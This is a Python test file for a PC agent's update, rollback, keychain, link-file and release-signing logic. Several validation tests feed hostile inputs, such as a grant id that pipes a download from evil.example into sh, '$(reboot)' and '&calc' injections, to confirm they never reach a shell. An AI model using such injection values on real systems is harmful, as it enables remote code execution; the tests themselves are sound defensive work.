"""Review 3 fixes for the PC agent and the release pipeline: rollback counting, keychain errors, the
Windows self-test record, checked grant ids and labels, the protocol version, the link file, the
service signatures, hash-checked installs, the Python-packed extension and the release version gate."""

from __future__ import annotations

import asyncio
import hashlib
import inspect
import json
import logging
import os
import re
import subprocess
import sys
import time
import zipfile
from datetime import UTC, datetime
from pathlib import Path
from types import SimpleNamespace
from urllib.parse import parse_qs, urlparse

import httpx
import pytest
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import encode_dss_signature
from keyring.errors import KeyringError, KeyringLocked

import kw_mcp
from kw_mcp import agent, release
from kw_mcp.service import KlasService

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))
import release as release_script

sys.path.pop(0)

SERVER = "https://bridge.example"
LINK = agent.Link(server=SERVER, ws_url="wss://ws.example/prod", uid="u_" + "a" * 22)
GRANT = "g_AbC123-_xyz9"  # the bridge's format: "g_" + 12 base64url characters
PINS = "# kw-mcp {v}\n# exclude-newer: 2026-11-01T00:00:00Z\nhttpx==0.28.1 \\\n    --hash=sha256:00\n"


@pytest.fixture(autouse=True)
def config_dir(tmp_path, monkeypatch):
    monkeypatch.setattr(agent, "CONFIG_DIR", tmp_path / "config")
    monkeypatch.setattr(agent, "LINK_FILE", tmp_path / "config" / "agent.json")
    monkeypatch.setattr(agent.os, "name", "posix")
    monkeypatch.setattr(agent, "in_uv_tool", lambda: True)
    monkeypatch.setattr(agent, "find_uv", lambda: "/opt/homebrew/bin/uv")
    return tmp_path / "config"


class Uv:
    """Stands in for subprocess.run: records every uv and self-test run as "install 0.9.1", "hashes
    0.9.1" or "self-test 0.9.1"; the runs named in `fail` fail."""

    def __init__(self, monkeypatch, fail=()):
        self.ran, self.fail = [], set(fail)
        monkeypatch.setattr(agent.subprocess, "run", self)

    @staticmethod
    def kind(argv: list[str]) -> str:
        version = re.search(r"kw_mcp-([0-9.]+)-", argv[-1])
        if argv[1:3] == ["tool", "install"]:
            return f"install {version[1]}"
        if argv[1:3] == ["pip", "install"]:
            return f"hashes {version[1]}"
        return f"self-test {argv[-1]}" if "--expect" in argv else " ".join(argv)

    def __call__(self, argv, **kwargs):
        self.ran.append(self.kind([str(a) for a in argv]))
        code = 1 if self.ran[-1] in self.fail else 0
        return SimpleNamespace(returncode=code, stderr="boom" if code else "", stdout="")

    def kinds(self) -> list[str]:
        return self.ran


def saved_release(version: str) -> tuple[Path, Path]:
    folder = agent.releases_dir()
    folder.mkdir(parents=True, exist_ok=True)
    wheel = folder / f"kw_mcp-{version}-py3-none-any.whl"
    wheel.write_bytes(b"PK")
    pins = folder / release.constraints_name(version)
    pins.write_text(PINS.format(v=version))
    return wheel, pins


def trial(version="0.9.1", previous="0.9.0", **extra) -> dict:
    return {"version": version, "previous": previous, "starts": 0, "failures": 0, **extra}


# --- MF1: every start on trial counts; no clean stop on the error path ----------------------

def test_a_release_that_raises_at_start_is_rolled_back(monkeypatch):
    monkeypatch.setattr(agent, "load_link", lambda: LINK)
    monkeypatch.setattr(agent, "installed_version", lambda: "0.9.1")
    agent.save_state({"running": False, "pending": trial()})

    async def broken(connected=None):
        raise NameError("bug in 0.9.1")

    async def idle(server, first_delay):
        await asyncio.sleep(3600)

    async def nothing_newer(http, server):
        return None

    rolled = []
    monkeypatch.setattr(agent, "run_forever", broken)
    monkeypatch.setattr(agent, "update_loop", idle)
    monkeypatch.setattr(agent, "update_once", nothing_newer)
    monkeypatch.setattr(agent, "roll_back", lambda pending: rolled.append(pending["version"]) or True)
    assert asyncio.run(agent.main()) == 1
    state = agent.load_state()
    assert state["running"] is True and state["pending"]["starts"] == 1  # no clean stop written
    assert asyncio.run(agent.main()) == 1 and rolled == []
    assert asyncio.run(agent.main()) == agent.RESTART_EXIT_CODE and rolled == ["0.9.1"]
    assert "pending" not in agent.load_state() and agent.load_state()["running"] is False


def test_a_release_that_starts_and_stays_up_is_kept(monkeypatch):
    monkeypatch.setattr(agent, "installed_version", lambda: "0.9.1")
    monkeypatch.setattr(agent, "HEALTHY_AFTER_S", 0)
    agent.save_state({"running": False, "pending": trial()})
    assert agent.note_start() == (False, None)

    async def stay_up() -> None:
        connected = asyncio.Event()
        connected.set()
        await agent._keep_if_healthy(connected, time.monotonic())

    asyncio.run(stay_up())
    agent.note_stop()
    for _ in range(agent.MAX_FAILED_STARTS + 2):  # the trial is over: restarts no longer count
        assert agent.note_start() == (False, None)
        agent.note_stop()


def test_pending_records_from_older_agents_still_count(monkeypatch):
    monkeypatch.setattr(agent, "installed_version", lambda: "1.0.0")
    agent.save_state({"running": False, "pending": {"version": "1.0.0", "previous": "0.9.0", "failures": 0, "at": 1}})
    assert agent.note_start() == (False, None) and agent.load_state()["pending"]["starts"] == 1
    agent.save_state({**agent.load_state(), "pending": {"version": "1.0.0", "previous": "0.9.0", "starts": "junk"}})
    assert agent.note_start() == (True, None)  # an unreadable count starts over instead of crashing the agent


def test_kw_mcp_update_on_windows_records_the_stop_it_caused(monkeypatch, capsys):
    """Windows terminates the agent, which then can't write a clean stop: the CLI writes it, so the
    new version's first start is not a crash."""
    monkeypatch.setattr(agent, "load_link", lambda: LINK)
    monkeypatch.setattr(kw_mcp, "os", SimpleNamespace(name="nt", environ={}))
    agent.save_state({"running": True})  # the agent that is about to be terminated
    stopped = []
    monkeypatch.setattr(agent, "stop_running_agent", lambda: stopped.append("terminated") or True)
    monkeypatch.setattr(agent, "agent_running", lambda: False)  # its lock is free: it has exited
    wheel, pins = saved_release("0.9.2")

    async def found(http, server):
        return {"version": "0.9.2"}, wheel, pins

    def install(w, c, version):
        state = agent.load_state()  # what install_update records on Windows before the detached swap
        state["pending"] = trial("0.9.2", "0.9.1")
        agent.save_state(state)
        return True

    monkeypatch.setattr(agent, "fetch_update", found)
    monkeypatch.setattr(agent, "install_update", install)
    assert kw_mcp._update() == 0 and stopped == ["terminated"]
    assert agent.load_state()["running"] is False
    monkeypatch.setattr(agent, "installed_version", lambda: "0.9.2")
    assert agent.note_start(replaced=False) == (False, None)  # not a crash, start 1 of the trial
    assert agent.load_state()["pending"]["failures"] == 0


def test_stop_agent_cleanly_leaves_a_still_running_agent_alone(monkeypatch):
    agent.save_state({"running": True})
    monkeypatch.setattr(agent, "stop_running_agent", lambda: True)
    monkeypatch.setattr(agent, "agent_running", lambda: True)
    assert agent.stop_agent_cleanly(timeout=0) is True and agent.load_state()["running"] is True
    monkeypatch.setattr(agent, "stop_running_agent", lambda: False)
    assert agent.stop_agent_cleanly() is False


class UvOnDisk(Uv):
    """Uv that also keeps track of the version on disk: installed_version() reports the last install
    that went through, as it does for the running agent once uv has replaced its files."""

    def __init__(self, monkeypatch, installed: str, fail=()):
        super().__init__(monkeypatch, fail)
        self.installed = installed
        monkeypatch.setattr(agent, "installed_version", lambda: self.installed)

    def __call__(self, argv, **kwargs):
        done = super().__call__(argv, **kwargs)
        if self.ran[-1].startswith("install ") and done.returncode == 0:
            self.installed = self.ran[-1].split()[1]
        return done


class WindowsOs:
    """agent.os, as on Windows: os.name is "nt" for the agent only (pathlib keeps its own)."""

    name = "nt"

    def __getattr__(self, attr):
        return getattr(os, attr)


@pytest.fixture
def on_windows(monkeypatch):
    monkeypatch.setattr(agent, "os", WindowsOs())
    swapped = []
    monkeypatch.setattr(agent, "_windows_swap", lambda uv, files, version, back: swapped.append((files, version, back)))
    return swapped


def stay_up() -> None:
    """The version that runs connects and stays up long enough (HEALTHY_AFTER_S = 0)."""
    async def run() -> None:
        connected = asyncio.Event()
        connected.set()
        await agent._keep_if_healthy(connected, time.monotonic())

    asyncio.run(run())


def test_an_update_that_fails_from_a_version_on_trial_puts_the_running_version_back(monkeypatch):
    """0.9.1 runs on trial (0.9.0 stayed up before it); 0.9.2 fails its self-test. 0.9.1 goes back
    on disk, not 0.9.0, and its own trial goes on: what is on disk is what runs."""
    monkeypatch.setattr(agent, "HEALTHY_AFTER_S", 0)
    saved_release("0.9.0")
    saved_release("0.9.1")
    on_trial = trial("0.9.1", "0.9.0", starts=1)
    agent.save_state({"running": True, "pending": on_trial})
    uv = UvOnDisk(monkeypatch, "0.9.1", fail=["self-test 0.9.2"])
    assert agent.install_update(*saved_release("0.9.2"), "0.9.2") is False  # carry on
    assert uv.kinds() == ["install 0.9.2", "hashes 0.9.2", "self-test 0.9.2", "install 0.9.1", "hashes 0.9.1",
                          "self-test 0.9.1"]
    assert uv.installed == "0.9.1"
    state = agent.load_state()
    assert state["pending"] == on_trial and state["skip"] == {"0.9.2": 0}  # its trial goes on unchanged
    stay_up()  # 0.9.1's own keeper: it ran fine, so it is kept, and its files with it
    assert "pending" not in agent.load_state() and agent.release_files("0.9.1") and not agent.release_files("0.9.0")


def test_an_update_from_a_version_on_trial_rolls_back_to_the_last_one_that_stayed_up(monkeypatch):
    saved_release("0.9.0")
    saved_release("0.9.1")
    agent.save_state({"running": True, "pending": trial("0.9.1", "0.9.0", starts=1)})
    uv = UvOnDisk(monkeypatch, "0.9.1")
    assert agent.install_update(*saved_release("0.9.2"), "0.9.2") is True
    pending = agent.load_state()["pending"]
    assert pending["version"] == "0.9.2" and pending["previous"] == "0.9.0" and "resume" not in pending
    uv.ran.clear()
    assert agent.roll_back(pending) is True  # 0.9.2 then never stays up: back to 0.9.0, not unproven 0.9.1
    assert uv.kinds() == ["install 0.9.0", "hashes 0.9.0", "self-test 0.9.0"] and uv.installed == "0.9.0"


def test_without_a_copy_of_the_running_version_the_last_good_one_goes_back_and_the_agent_restarts(monkeypatch):
    saved_release("0.9.0")  # 0.9.1, on trial, has no saved copy
    agent.save_state({"running": True, "pending": trial("0.9.1", "0.9.0", starts=1)})
    uv = UvOnDisk(monkeypatch, "0.9.1", fail=["self-test 0.9.2"])
    wheel, pins = saved_release("0.9.2")

    async def found(http, server):
        return {"version": "0.9.2"}, wheel, pins

    monkeypatch.setattr(agent, "fetch_update", found)
    assert asyncio.run(agent.update_once(None, SERVER)) == "0.9.0"  # exit, and start into what is on disk
    assert uv.kinds() == ["install 0.9.2", "hashes 0.9.2", "self-test 0.9.2", "install 0.9.0", "hashes 0.9.0",
                          "self-test 0.9.0"]
    state = agent.load_state()
    assert "pending" not in state and state["skip"] == {"0.9.2": 0}
    agent.note_stop()  # main() records the clean stop before it exits with RESTART_EXIT_CODE
    assert agent.note_start() == (False, None) and "pending" not in agent.load_state()  # 0.9.0, not on trial


def test_a_version_that_is_not_on_trial_and_has_no_copy_stays_as_it_was(monkeypatch):
    uv = UvOnDisk(monkeypatch, "0.9.1", fail=["self-test 0.9.2"])
    assert agent.install_update(*saved_release("0.9.2"), "0.9.2") is False
    assert uv.kinds() == ["install 0.9.2", "hashes 0.9.2", "self-test 0.9.2"]  # nothing to put back


def test_on_windows_the_running_version_goes_back_and_its_trial_resumes(monkeypatch, on_windows, config_dir):
    saved_release("0.9.0")
    running = saved_release("0.9.1")
    on_trial = trial("0.9.1", "0.9.0", starts=1)
    agent.save_state({"running": True, "pending": on_trial})
    monkeypatch.setattr(agent, "installed_version", lambda: "0.9.1")
    new = saved_release("0.9.2")
    assert agent.install_update(*new, "0.9.2") is True
    assert on_windows == [(new, "0.9.2", running)]  # the detached shell puts 0.9.1 back if 0.9.2 fails
    pending = agent.load_state()["pending"]
    assert pending["previous"] == "0.9.0" and pending["resume"] == on_trial
    agent.note_stop()
    # The shell saw 0.9.2 fail its self-test, put 0.9.1 back and started it again.
    (config_dir / agent.SELF_TEST_FAILED).write_text("0.9.2 \r\n")
    assert agent.note_start() == (False, None)
    state = agent.load_state()
    assert state["pending"] == on_trial and state["skip"]["0.9.2"] == 0  # same starts: the update stopped it
    # 0.9.2 went through instead: its trial starts, and the resume record plays no part.
    agent.save_state({"running": False, "pending": {**pending}})
    monkeypatch.setattr(agent, "installed_version", lambda: "0.9.2")
    assert agent.note_start() == (False, None) and agent.load_state()["pending"]["starts"] == 1


def test_on_windows_without_a_copy_of_the_running_version_the_last_good_one_goes_back(monkeypatch, on_windows):
    good = saved_release("0.9.0")
    agent.save_state({"running": True, "pending": trial("0.9.1", "0.9.0", starts=1)})
    monkeypatch.setattr(agent, "installed_version", lambda: "0.9.1")
    new = saved_release("0.9.2")
    assert agent.install_update(*new, "0.9.2") is True and on_windows == [(new, "0.9.2", good)]
    agent.note_stop()
    monkeypatch.setattr(agent, "installed_version", lambda: "0.9.0")  # the shell put 0.9.0 back
    assert agent.note_start() == (False, None) and "pending" not in agent.load_state()  # 0.9.0 stayed up before


def test_a_version_that_stayed_up_waits_for_an_update_that_is_installing(monkeypatch):
    monkeypatch.setattr(agent, "HEALTHY_AFTER_S", 0)
    monkeypatch.setattr(agent, "INSTALL_WAIT_S", 0.01)
    disk = {"version": "0.9.1"}
    monkeypatch.setattr(agent, "installed_version", lambda: disk["version"])

    async def keep_while_installing(outcome: str) -> None:
        connected = asyncio.Event()
        connected.set()
        agent._INSTALLING.acquire()  # the updater's thread is installing 0.9.2
        try:
            keeper = asyncio.create_task(agent._keep_if_healthy(connected, time.monotonic()))
            await asyncio.sleep(0.1)
            assert not keeper.done() and agent.load_state()["pending"]["version"] == "0.9.1"
            assert all(agent.release_files(v) for v in ("0.9.0", "0.9.1", "0.9.2"))
            disk["version"] = outcome
        finally:
            agent._INSTALLING.release()
        await asyncio.wait_for(keeper, 1)

    for v in ("0.9.0", "0.9.1", "0.9.2"):
        saved_release(v)
    agent.save_state({"running": True, "pending": trial("0.9.1", "0.9.0", starts=1)})
    asyncio.run(keep_while_installing("0.9.2"))  # it went through: the agent exits into 0.9.2
    assert agent.load_state()["pending"]["version"] == "0.9.1"  # (install_update writes 0.9.2's own)
    assert all(agent.release_files(v) for v in ("0.9.0", "0.9.1", "0.9.2"))  # 0.9.0 is 0.9.2's way back
    disk["version"] = "0.9.1"
    asyncio.run(keep_while_installing("0.9.1"))  # it failed and 0.9.1 is back: 0.9.1 stayed up
    assert "pending" not in agent.load_state() and agent.release_files("0.9.1")
    assert not agent.release_files("0.9.0") and not agent.release_files("0.9.2")


def test_kw_mcp_update_says_which_version_went_back(monkeypatch, capsys):
    monkeypatch.setattr(agent, "load_link", lambda: LINK)
    disk = {"version": "0.9.1"}
    monkeypatch.setattr(agent, "installed_version", lambda: disk["version"])
    wheel, pins = saved_release("0.9.2")

    async def found(http, server):
        return {"version": "0.9.2"}, wheel, pins

    def install(w, c, version):  # 0.9.2 failed, 0.9.1 had no copy, 0.9.0 went back
        disk["version"] = "0.9.0"
        return True

    monkeypatch.setattr(agent, "fetch_update", found)
    monkeypatch.setattr(agent, "install_update", install)
    monkeypatch.setattr(agent, "restart_autostarted_agent", lambda: True)
    assert kw_mcp._update() == 1
    out = capsys.readouterr().out
    assert "0.9.2 설치에 실패했고 0.9.1(으)로 되돌리지 못해 마지막으로 잘 돌던 0.9.0(으)로 되돌렸습니다." in out
    assert "에이전트를 0.9.0(으)로 다시 시작했습니다." in out and "설치를 마쳤습니다" not in out


# --- S34: the link file, and a version on trial that can't read it ---------------------------

def test_load_link_ignores_keys_it_does_not_know(config_dir):
    config_dir.mkdir(parents=True)
    agent.LINK_FILE.write_text(json.dumps({**LINK.__dict__, "added_in_a_later_version": {"x": 1}}))
    assert agent.load_link() == LINK
    for broken in ({"server": SERVER, "ws_url": LINK.ws_url}, {**LINK.__dict__, "uid": 7}, {**LINK.__dict__, "uid": ""},
                   [LINK.server], "text"):
        agent.LINK_FILE.write_text(json.dumps(broken))
        with pytest.raises(agent.NotLinked):
            agent.load_link()


def test_a_version_on_trial_that_cannot_read_the_link_exits_non_zero(monkeypatch):
    monkeypatch.setattr(agent, "installed_version", lambda: "0.9.1")
    agent.save_state({"running": False, "pending": trial()})
    assert asyncio.run(agent.main()) == 1  # launchd starts it again, and the starts add up
    assert agent.load_state()["pending"]["starts"] == 1
    agent.save_state({"running": False})
    with pytest.raises(agent.NotLinked):  # not on trial: unlinked, stay down (kw-mcp agent exits 0)
        asyncio.run(agent.main())


# --- S19: the keychain refusing the device key --------------------------------------------

def test_a_refused_device_key_is_asked_again_later_not_restarted_every_30_s(monkeypatch, caplog):
    monkeypatch.setattr(agent, "KEYCHAIN_RETRY_S", 0)
    key, asked = agent.DeviceKey.generate(), []

    def load():
        asked.append(1)
        if len(asked) == 1:
            raise KeyringLocked("locked")
        return key

    monkeypatch.setattr(agent.DeviceKey, "load", staticmethod(load))
    with caplog.at_level(logging.ERROR, logger="kw_mcp.agent"):
        assert asyncio.run(agent._device_key()) is key
    assert len(asked) == 2 and "keychain refused the device key (KeyringLocked)" in caplog.text


def test_a_keychain_error_at_agent_start_is_logged_and_exits_cleanly(monkeypatch, caplog):
    async def refused(replace=False):
        raise KeyringError("denied")

    monkeypatch.setattr(agent, "configure_logging", lambda log_file: None)
    monkeypatch.setattr(agent, "main", refused)
    with caplog.at_level(logging.ERROR, logger="kw_mcp.agent"):
        kw_mcp._agent(None, False)  # returns: exit code 0, so launchd doesn't loop on the keychain
    assert "keychain refused access (KeyringError)" in caplog.text


# --- S20: Windows remembers a failed self-test ------------------------------------------------

def test_a_self_test_that_failed_on_windows_is_skipped_for_good(monkeypatch, config_dir):
    monkeypatch.setattr(agent, "installed_version", lambda: "0.9.0")  # the detached shell put 0.9.0 back
    config_dir.mkdir(parents=True)
    agent.save_state({"running": False, "pending": trial()})
    (config_dir / agent.SELF_TEST_FAILED).write_text("0.9.1 \r\n")  # what `echo 0.9.1 > file` writes
    assert agent.note_start() == (False, None)
    assert agent.load_state()["skip"]["0.9.1"] == 0 and not (config_dir / agent.SELF_TEST_FAILED).exists()
    agent.save_state({"running": False, "pending": trial("0.9.2")})  # no record: the install itself failed
    agent.note_start()
    assert agent.load_state()["skip"]["0.9.2"] > time.time() + 23 * 3600


def test_the_windows_command_records_the_self_test_and_checks_hashes(monkeypatch, tmp_path):
    spawned = []
    monkeypatch.setattr(agent, "_spawn_windows", spawned.append)
    monkeypatch.setenv("ComSpec", r"C:\Windows\system32\cmd.exe")
    new, back = saved_release("0.9.1"), saved_release("0.9.0")
    agent._windows_swap("uv.exe", new, "0.9.1", back)
    line = spawned[0]
    marker = str(agent.CONFIG_DIR / agent.SELF_TEST_FAILED)
    install, rest = line.split(f'echo 0.9.1 > "{marker}" && ', 1)
    assert '"uv.exe" "tool" "install"' in install and '"uv.exe" "pip" "install"' in install  # hashes, then the marker
    test, undo = rest.split(" || ", 1)
    assert '"--expect" "0.9.1"' in test and test.rstrip().endswith(f'del "{marker}" >> "{agent.default_log_file().with_name("update.log")}" 2>&1')
    assert undo.count('"pip" "install" "--python"') == 1 and "kw_mcp-0.9.0-constraints.txt" in undo  # rollback hash-checked too
    with pytest.raises(ValueError, match="release version"):
        agent.windows_update_command("cmd.exe", pid=1, install=[["uv"]], check=["py"], rollback=None,
                                     log_file=tmp_path / "log", restart=["py"], marker=tmp_path / "m",
                                     version="1.0&calc")


# --- S21: only checked values reach a notification or a revoke command -------------------------

def test_a_hostile_grant_id_or_host_never_becomes_a_command(monkeypatch):
    shown = []
    monkeypatch.setattr(agent, "notify", lambda title, text: shown.append(text))
    agent._paired({"grant_id": "g_abc; curl evil.example | sh", "redirect_host": 'evil.example"; touch x',
                   "app": "Claude", "client_name": "Claude"})
    agent._paired({"grant_id": GRANT, "redirect_host": "Evil.Example", "app": "Claude"})
    agent._paired({"grant_id": GRANT, "redirect_host": "chatgpt.com"})
    assert shown[0].startswith("새 연결: 알 수 없는 앱.") and "kw-mcp revoke <ID>" in shown[0]
    assert "curl" not in shown[0] and "touch" not in shown[0] and "kw-mcp connections" in shown[0]
    assert shown[1].startswith("새 연결: evil.example.") and f"kw-mcp revoke {GRANT}`" in shown[1]  # never "Claude"
    assert shown[2].startswith("새 연결: ChatGPT (chatgpt.com).")


def test_connections_list_only_well_formed_ids_and_hosts(monkeypatch, capsys):
    monkeypatch.setattr(agent, "_device_call", lambda path, purpose, **extra: httpx.Response(200, json={"grants": [
        {"id": GRANT, "client": "Claude", "redirect_host": "claude.ai"},
        {"id": "g_x$(reboot)", "client": "Evil", "redirect_host": "a b;c"},
        {"id": 12345, "client": "Odd", "redirect_host": None}]}, request=httpx.Request("POST", SERVER)))
    rows = agent.grants()
    assert [(r["id"], r["redirect_host"]) for r in rows] == [(GRANT, "claude.ai"), ("", ""), ("", "")]
    monkeypatch.setattr(sys, "argv", ["kw-mcp", "connections"])
    with pytest.raises(SystemExit) as done:
        kw_mcp.main()
    out = capsys.readouterr().out
    assert done.value.code == 0 and f"{GRANT}  Claude  claude.ai" in out and "(ID 형식 오류)  Evil" in out
    assert "reboot" not in out


# --- S33: protocol version 3 ----------------------------------------------------------------

def test_the_agent_announces_protocol_3_and_signs_it():
    key = agent.DeviceKey.generate()
    q = {k: v[0] for k, v in parse_qs(urlparse(agent._connect_url(LINK, key)).query).items()}
    assert agent.PROTOCOL_VERSION == 3 and q["v"] == "3"
    raw = agent.b64u_decode(q["sig"])
    der = encode_dss_signature(int.from_bytes(raw[:32], "big"), int.from_bytes(raw[32:], "big"))
    # What the bridge's $connect checks: the versioned message, and a version of at least 2 for calls.
    key._key.public_key().verify(der, f"kw-connect:{LINK.uid}:{q['ts']}:{q['v']}".encode(), ec.ECDSA(hashes.SHA256()))
    assert max(1, min(int(q["v"]), 99)) >= 2


# --- S32: the bridge's arguments bind to the real service ------------------------------------

@pytest.mark.parametrize("op", sorted(agent.CALLS))
def test_call_args_bind_to_the_real_service_signature(op):
    signature = inspect.signature(getattr(KlasService, op))
    for args in ({name: "x" for name in agent.CALLS[op]}, {}, None):
        bound = signature.bind(None, **agent.call_args(op, args))  # TypeError if a name or a count is off
        assert set(bound.arguments) - {"self"} == {agent.ARG_NAMES.get(op, {}).get(n, n) for n in agent.CALLS[op]}


class Holder:
    def __init__(self, service):
        self._service = service

    async def service(self):
        return self._service


async def test_ids_reach_the_real_service_lookups_under_their_own_names():
    service, seen = KlasService(client=None), []

    async def find_task(course, title, task_id=None):
        seen.append(("task", course, title, task_id))
        raise LookupError("stop here")

    async def find_post(course, title, post_id=None):
        seen.append(("post", course, title, post_id))
        raise LookupError("stop here")

    service._find_task, service._find_post = find_task, find_post
    holder = Holder(service)
    for op, args in (("assignment_detail", {"course": "a", "title": "b", "id": "T1"}),
                     ("course_post", {"course": "a", "title": "b", "id": "P9"}),
                     ("course_post", {"course": "a", "title": "b"}),
                     # the bridge always sends source and part (my_attachment's defaults)
                     ("read_attachment", {"course": "a", "title": "b", "part": "1", "source": "post", "id": "P7", "file_index": 2}),
                     ("read_attachment", {"course": "a", "title": "b", "part": "1", "source": "assignment", "id": "T5"})):
        assert (await agent.build_result(holder, op, args))["error"] == "not_found"
    assert seen == [("task", "a", "b", "T1"), ("post", "a", "b", "P9"), ("post", "a", "b", None),
                    ("post", "a", "b", "P7"), ("task", "a", "b", "T5")]


# --- S18: hash-checked installs ---------------------------------------------------------------

def test_dependencies_that_fail_their_hashes_put_the_previous_version_back(monkeypatch):
    monkeypatch.setattr(agent, "installed_version", lambda: "0.9.0")
    saved_release("0.9.0")
    uv = Uv(monkeypatch, fail=["hashes 0.9.1"])
    assert agent.install_update(*saved_release("0.9.1"), "0.9.1") is False
    assert uv.kinds() == ["install 0.9.1", "hashes 0.9.1", "install 0.9.0", "hashes 0.9.0", "self-test 0.9.0"]
    assert agent.load_state()["skip"]["0.9.1"] > time.time() + 23 * 3600 and "pending" not in agent.load_state()


def test_a_rollback_is_hash_checked_too(monkeypatch):
    saved_release("0.9.0")
    uv = Uv(monkeypatch)
    assert agent.roll_back(trial()) is True
    assert uv.kinds() == ["install 0.9.0", "hashes 0.9.0", "self-test 0.9.0"]


def test_the_release_smoke_install_checks_hashes_like_an_agent(monkeypatch, tmp_path):
    ran = []
    monkeypatch.setattr(release_script, "run", lambda argv, cwd, env=None: ran.append((argv, env)))
    monkeypatch.setattr(release_script.shutil, "which", lambda name: "/usr/bin/uv")
    wheel, pins = tmp_path / "kw_mcp-0.9.1-py3-none-any.whl", tmp_path / "kw_mcp-0.9.1-constraints.txt"
    pins.write_text(PINS.format(v="0.9.1"))
    release_script.smoke_install(tmp_path, wheel, pins, "0.9.1", tmp_path / "work")
    (install, env), (hashes_, _), (test, _) = ran
    assert install[1:3] == ["tool", "install"] and hashes_[1:3] == ["pip", "install"] and "--require-hashes" in hashes_
    assert hashes_[hashes_.index("--python") + 1] == str(tmp_path / "work" / "tools" / "kw-mcp" / "bin" / "python")
    assert test[-2:] == ["--expect", "0.9.1"] and env["UV_TOOL_DIR"] == str(tmp_path / "work" / "tools")


# --- B3: the extension is packed in Python, before any third-party code runs -----------------

def manifest(version="0.9.1") -> dict:
    return {"manifest_version": "0.4", "name": "kw-klas", "version": version, "description": "d",
            "author": {"name": "a"}, "server": {"type": "uv", "entry_point": "src/kw_mcp/__main__.py",
                                                "mcp_config": {"command": "uv", "args": ["run"], "env": {"A": "b"}}}}


def checkout(root: Path, version="0.9.1", code=b"print('v')") -> Path:
    (root / "src" / "kw_mcp").mkdir(parents=True, exist_ok=True)
    (root / "manifest.json").write_text(json.dumps(manifest(version)))
    (root / "pyproject.toml").write_text(f'[project]\nname = "kw-mcp"\nversion = "{version}"\n')
    (root / "uv.lock").write_text(f'version = 1\n\n[[package]]\nname = "kw-mcp"\nversion = "{version}"\n')
    (root / "LICENSE").write_text("MIT License")
    (root / "src" / "kw_mcp" / "server.py").write_bytes(code)
    (root / "src" / "kw_mcp" / "__main__.py").write_text("from kw_mcp import main\n")
    return root


def test_the_python_pack_is_a_plain_mcpb_zip(tmp_path):
    stage = checkout(tmp_path / "stage")
    when = datetime(2026, 11, 6, 9, 0, tzinfo=UTC)
    names = release_script.pack_mcpb(stage, tmp_path / "a.mcpb", when)
    release_script.pack_mcpb(stage, tmp_path / "b.mcpb", when)
    assert (tmp_path / "a.mcpb").read_bytes() == (tmp_path / "b.mcpb").read_bytes()  # the same commit, the same bytes
    with zipfile.ZipFile(tmp_path / "a.mcpb") as z:
        infos = z.infolist()
        assert z.testzip() is None and sorted(z.namelist()) == names and "manifest.json" in names
        assert json.loads(z.read("manifest.json"))["version"] == "0.9.1"
    assert all(not i.is_dir() and i.compress_type == zipfile.ZIP_DEFLATED and i.create_system == 3
               and i.external_attr >> 16 == 0o644 and i.date_time == (2026, 11, 6, 9, 0, 0) for i in infos)
    assert "src/kw_mcp/server.py" in names and not (tmp_path / "a.mcpb.part").exists()


def test_the_python_pack_refuses_a_bad_manifest_or_stray_files(tmp_path):
    stage = checkout(tmp_path / "stage")
    (stage / ".env").write_text("SECRET=1")
    with pytest.raises(release_script.ReleaseError, match="don't belong"):
        release_script.pack_mcpb(stage, tmp_path / "x.mcpb", datetime.now(UTC))
    (stage / ".env").unlink()
    for broken in ({"manifest_version": "9.9"}, {"server": {"type": "uv", "entry_point": "missing.py", "mcp_config": {"command": "uv"}}},
                   {"author": "nobody"}, {"description": ""}):
        (stage / "manifest.json").write_text(json.dumps({**manifest(), **broken}))
        with pytest.raises(release_script.ReleaseError, match="not a valid extension manifest"):
            release_script.pack_mcpb(stage, tmp_path / "x.mcpb", datetime.now(UTC))
    assert not (tmp_path / "x.mcpb").exists()


def repo(tmp_path: Path, version="0.9.1", tags=(), ignore="") -> Path:
    root = checkout(tmp_path / "repo", version)
    if ignore:
        (root / ".gitignore").write_text(ignore)
    for args in (["init", "-q"], ["add", "."], ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "x"],
                 *[["tag", t] for t in tags]):
        subprocess.run(["git", *args], cwd=root, check=True, capture_output=True)
    return root


def fake_release_steps(monkeypatch, tamper=None):
    """uv, pytest and the wheel build replaced by fakes; `tamper(wheel)` runs where the test install would."""
    monkeypatch.setattr(release_script, "run", lambda argv, cwd, env=None: None)

    def wheel_and_pins(src, files, version):
        wheel = files / f"kw_mcp-{version}-py3-none-any.whl"
        with zipfile.ZipFile(wheel, "w") as z:
            for path in sorted((src / "src" / "kw_mcp").iterdir()):
                z.writestr(f"kw_mcp/{path.name}", path.read_bytes())
            z.writestr(f"kw_mcp-{version}.dist-info/METADATA", f"Metadata-Version: 2.4\nName: kw-mcp\nVersion: {version}\n")
        pins = files / release.constraints_name(version)
        pins.write_text(PINS.format(v=version))
        return wheel, pins

    monkeypatch.setattr(release_script, "wheel_and_pins", wheel_and_pins)
    monkeypatch.setattr(release_script, "smoke_install",
                        lambda src, wheel, constraints, version, work: tamper and tamper(wheel))


def test_a_dry_run_signs_the_python_packed_extension(tmp_path, monkeypatch):
    root = repo(tmp_path, tags=["v0.9.1"])
    fake_release_steps(monkeypatch)
    manifest_ = release_script.build(root, tmp_path / "out", dry_run=True)
    assert manifest_["version"] == "0.9.1" and (tmp_path / "out" / release.MCPB_NAME).is_file()
    assert manifest_["mcpb"]["sha256"] == hashlib.sha256((tmp_path / "out" / release.MCPB_NAME).read_bytes()).hexdigest()
    public = (tmp_path / "out" / "DRY-RUN-NOT-DEPLOYABLE").read_text().split()[-1]
    assert release.check_release(tmp_path / "out", public)["mcpb"]["file"] == release.MCPB_NAME


def test_nothing_is_signed_if_the_wheel_changed_after_it_was_built(tmp_path, monkeypatch):
    root = repo(tmp_path, tags=["v0.9.1"])

    def tamper(wheel: Path) -> None:  # a dependency of the test install rewriting the wheel it was given
        with zipfile.ZipFile(wheel, "a") as z:
            z.writestr("kw_mcp/agent.py", "steal()")

    fake_release_steps(monkeypatch, tamper)
    with pytest.raises(release_script.ReleaseError, match="kw_mcp-0.9.1-py3-none-any.whl changed during the test install"):
        release_script.build(root, tmp_path / "out", dry_run=True)
    assert not (tmp_path / "out").exists()


def test_a_release_runs_no_npm(monkeypatch, tmp_path):
    root = repo(tmp_path, tags=["v0.9.1"])
    fake_release_steps(monkeypatch)
